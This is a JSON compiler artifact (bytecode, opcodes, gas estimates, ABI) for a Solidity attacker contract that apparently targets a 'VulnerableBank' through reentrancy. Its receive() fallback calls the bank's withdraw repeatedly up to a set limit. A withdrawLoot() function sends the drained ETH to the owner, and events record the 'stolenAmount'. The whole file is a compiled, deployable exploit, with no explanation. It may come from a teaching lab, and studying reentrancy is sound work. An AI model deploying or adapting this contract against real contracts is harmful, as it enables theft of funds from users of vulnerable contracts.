{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561000f575f80fd5b50604051610b9a380380610b9a8339818101604052810190610031919061011b565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506003808190555050610146565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100ea826100c1565b9050919050565b6100fa816100e0565b8114610104575f80fd5b50565b5f81519050610115816100f1565b92915050565b5f602082840312156101305761012f6100bd565b5b5f61013d84828501610107565b91505092915050565b610a47806101535f395ff3fe608060405260043610610073575f3560e01c80639e5faafc1161004d5780639e5faafc1461021b578063a1c9aee114610225578063dad3c4381461024f578063f2433f901461027957610199565b806312065fe01461019d578063407c2821146101c75780638da5cb5b146101f157610199565b366101995760025f81548092919061008a906106be565b91905055505f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163190507f718aafc0ce5eb9d1ea1c9943e1fa2bd5616f1d2057f2b4ca9bdb7ca2eb6610a9600254826040516100fd929190610714565b60405180910390a160035460025410801561011757505f81115b15610197575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610180575f80fd5b505af1158015610192573d5f803e3d5ffd5b505050505b005b5f80fd5b3480156101a8575f80fd5b506101b161028f565b6040516101be919061073b565b60405180910390f35b3480156101d2575f80fd5b506101db610296565b6040516101e8919061073b565b60405180910390f35b3480156101fc575f80fd5b5061020561029c565b6040516102129190610793565b60405180910390f35b6102236102c1565b005b348015610230575f80fd5b506102396104c8565b6040516102469190610807565b60405180910390f35b34801561025a575f80fd5b506102636104eb565b604051610270919061073b565b60405180910390f35b348015610284575f80fd5b5061028d6104f1565b005b5f47905090565b60025481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610350576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103479061087a565b60405180910390fd5b5f3411610392576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610389906108e2565b60405180910390fd5b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004015f604051808303818588803b1580156103f7575f80fd5b505af1158015610409573d5f803e3d5ffd5b50505050507f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a3460405161043d919061073b565b60405180910390a15f6002819055505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156104b0575f80fd5b505af11580156104c2573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610580576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105779061094a565b60405180910390fd5b5f4790505f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16826040516105ca90610995565b5f6040518083038185875af1925050503d805f8114610604576040519150601f19603f3d011682016040523d82523d5f602084013e610609565b606091505b505090508061064d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610644906109f3565b60405180910390fd5b7f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f98260405161067c919061073b565b60405180910390a15050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6106c8826106b5565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036106fa576106f9610688565b5b600182019050919050565b61070e816106b5565b82525050565b5f6040820190506107275f830185610705565b6107346020830184610705565b9392505050565b5f60208201905061074e5f830184610705565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61077d82610754565b9050919050565b61078d81610773565b82525050565b5f6020820190506107a65f830184610784565b92915050565b5f819050919050565b5f6107cf6107ca6107c584610754565b6107ac565b610754565b9050919050565b5f6107e0826107b5565b9050919050565b5f6107f1826107d6565b9050919050565b610801816107e7565b82525050565b5f60208201905061081a5f8301846107f8565b92915050565b5f82825260208201905092915050565b7f4f6e6c79206f776e65722063616e2061747461636b00000000000000000000005f82015250565b5f610864601583610820565b915061086f82610830565b602082019050919050565b5f6020820190508181035f83015261089181610858565b9050919050565b7f4e6565642045544820746f2061747461636b00000000000000000000000000005f82015250565b5f6108cc601283610820565b91506108d782610898565b602082019050919050565b5f6020820190508181035f8301526108f9816108c0565b9050919050565b7f4f6e6c79206f776e65722063616e2077697468647261770000000000000000005f82015250565b5f610934601783610820565b915061093f82610900565b602082019050919050565b5f6020820190508181035f83015261096181610928565b9050919050565b5f81905092915050565b50565b5f6109805f83610968565b915061098b82610972565b5f82019050919050565b5f61099f82610975565b9150819050919050565b7f5472616e73666572206661696c656400000000000000000000000000000000005f82015250565b5f6109dd600f83610820565b91506109e8826109a9565b602082019050919050565b5f6020820190508181035f830152610a0a816109d1565b905091905056fea2646970667358221220ff88e7b9d8d2bc521e2734ec6ac0803d9710352af1f729f689895da991649d2364736f6c63430008180033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xB9A CODESIZE SUB DUP1 PUSH2 0xB9A DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x11B JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x3 DUP1 DUP2 SWAP1 SSTORE POP POP PUSH2 0x146 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xEA DUP3 PUSH2 0xC1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFA DUP2 PUSH2 0xE0 JUMP JUMPDEST DUP2 EQ PUSH2 0x104 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x115 DUP2 PUSH2 0xF1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x130 JUMPI PUSH2 0x12F PUSH2 0xBD JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x13D DUP5 DUP3 DUP6 ADD PUSH2 0x107 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xA47 DUP1 PUSH2 0x153 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x73 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC GT PUSH2 0x4D JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x21B JUMPI DUP1 PUSH4 0xA1C9AEE1 EQ PUSH2 0x225 JUMPI DUP1 PUSH4 0xDAD3C438 EQ PUSH2 0x24F JUMPI DUP1 PUSH4 0xF2433F90 EQ PUSH2 0x279 JUMPI PUSH2 0x199 JUMP JUMPDEST DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x19D JUMPI DUP1 PUSH4 0x407C2821 EQ PUSH2 0x1C7 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1F1 JUMPI PUSH2 0x199 JUMP JUMPDEST CALLDATASIZE PUSH2 0x199 JUMPI PUSH1 0x2 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x8A SWAP1 PUSH2 0x6BE JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH0 DUP1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE SWAP1 POP PUSH32 0x718AAFC0CE5EB9D1EA1C9943E1FA2BD5616F1D2057F2B4CA9BDB7CA2EB6610A9 PUSH1 0x2 SLOAD DUP3 PUSH1 0x40 MLOAD PUSH2 0xFD SWAP3 SWAP2 SWAP1 PUSH2 0x714 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x3 SLOAD PUSH1 0x2 SLOAD LT DUP1 ISZERO PUSH2 0x117 JUMPI POP PUSH0 DUP2 GT JUMPDEST ISZERO PUSH2 0x197 JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x180 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x192 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1A8 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B1 PUSH2 0x28F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1BE SWAP2 SWAP1 PUSH2 0x73B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1D2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1DB PUSH2 0x296 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1E8 SWAP2 SWAP1 PUSH2 0x73B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1FC JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x205 PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x212 SWAP2 SWAP1 PUSH2 0x793 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x223 PUSH2 0x2C1 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x230 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x239 PUSH2 0x4C8 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x246 SWAP2 SWAP1 PUSH2 0x807 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x25A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x263 PUSH2 0x4EB JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x270 SWAP2 SWAP1 PUSH2 0x73B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x284 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x28D PUSH2 0x4F1 JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x350 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x347 SWAP1 PUSH2 0x87A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 CALLVALUE GT PUSH2 0x392 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x389 SWAP1 PUSH2 0x8E2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3F7 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x409 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH32 0x33F040BCC293552B556FB3082B0E9FB26495AEAE16EF365BD761C702978EEC0A CALLVALUE PUSH1 0x40 MLOAD PUSH2 0x43D SWAP2 SWAP1 PUSH2 0x73B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4B0 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4C2 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x580 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x577 SWAP1 PUSH2 0x94A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 SELFBALANCE SWAP1 POP PUSH0 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD PUSH2 0x5CA SWAP1 PUSH2 0x995 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x604 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x609 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x64D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x644 SWAP1 PUSH2 0x9F3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x4EF6191345AAE76824ED25FF5065E33A8FBBB5A05823EBBA2291FC6237A925F9 DUP3 PUSH1 0x40 MLOAD PUSH2 0x67C SWAP2 SWAP1 PUSH2 0x73B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6C8 DUP3 PUSH2 0x6B5 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x6FA JUMPI PUSH2 0x6F9 PUSH2 0x688 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x70E DUP2 PUSH2 0x6B5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x727 PUSH0 DUP4 ADD DUP6 PUSH2 0x705 JUMP JUMPDEST PUSH2 0x734 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x705 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x74E PUSH0 DUP4 ADD DUP5 PUSH2 0x705 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x77D DUP3 PUSH2 0x754 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x78D DUP2 PUSH2 0x773 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x7A6 PUSH0 DUP4 ADD DUP5 PUSH2 0x784 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7CF PUSH2 0x7CA PUSH2 0x7C5 DUP5 PUSH2 0x754 JUMP JUMPDEST PUSH2 0x7AC JUMP JUMPDEST PUSH2 0x754 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7E0 DUP3 PUSH2 0x7B5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7F1 DUP3 PUSH2 0x7D6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x801 DUP2 PUSH2 0x7E7 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x81A PUSH0 DUP4 ADD DUP5 PUSH2 0x7F8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206F776E65722063616E2061747461636B0000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x864 PUSH1 0x15 DUP4 PUSH2 0x820 JUMP JUMPDEST SWAP2 POP PUSH2 0x86F DUP3 PUSH2 0x830 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x891 DUP2 PUSH2 0x858 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E6565642045544820746F2061747461636B0000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x8CC PUSH1 0x12 DUP4 PUSH2 0x820 JUMP JUMPDEST SWAP2 POP PUSH2 0x8D7 DUP3 PUSH2 0x898 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x8F9 DUP2 PUSH2 0x8C0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4F6E6C79206F776E65722063616E207769746864726177000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x934 PUSH1 0x17 DUP4 PUSH2 0x820 JUMP JUMPDEST SWAP2 POP PUSH2 0x93F DUP3 PUSH2 0x900 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x961 DUP2 PUSH2 0x928 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x980 PUSH0 DUP4 PUSH2 0x968 JUMP JUMPDEST SWAP2 POP PUSH2 0x98B DUP3 PUSH2 0x972 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x99F DUP3 PUSH2 0x975 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x5472616E73666572206661696C65640000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9DD PUSH1 0xF DUP4 PUSH2 0x820 JUMP JUMPDEST SWAP2 POP PUSH2 0x9E8 DUP3 PUSH2 0x9A9 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA0A DUP2 PUSH2 0x9D1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT DUP9 0xE7 0xB9 0xD8 0xD2 0xBC MSTORE 0x1E 0x27 CALLVALUE 0xEC PUSH11 0xC0803D9710352AF1F729F6 DUP10 DUP10 TSTORE 0xA9 SWAP2 PUSH5 0x9D2364736F PUSH13 0x63430008180033000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "526200",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"attack()": "infinite",
				"attackCount()": "2448",
				"attackLimit()": "2469",
				"getBalance()": "335",
				"owner()": "2553",
				"vulnerableBank()": "infinite",
				"withdrawLoot()": "infinite"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"attackCount()": "407c2821",
			"attackLimit()": "dad3c438",
			"getBalance()": "12065fe0",
			"owner()": "8da5cb5b",
			"vulnerableBank()": "a1c9aee1",
			"withdrawLoot()": "f2433f90"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_vulnerableBankAddress",
					"type": "address"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "stolenAmount",
					"type": "uint256"
				}
			],
			"name": "AttackCompleted",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "initialDeposit",
					"type": "uint256"
				}
			],
			"name": "AttackStarted",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "count",
					"type": "uint256"
				},
				{
					"indexed": false,
					"internalType": "uint256",
					"name": "bankBalance",
					"type": "uint256"
				}
			],
			"name": "ReentrancyTriggered",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attackCount",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "attackLimit",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "getBalance",
			"outputs": [
				{
					"internalType": "uint256",
					"name": "",
					"type": "uint256"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "owner",
			"outputs": [
				{
					"internalType": "address",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "vulnerableBank",
			"outputs": [
				{
					"internalType": "contract VulnerableBank",
					"name": "",
					"type": "address"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawLoot",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}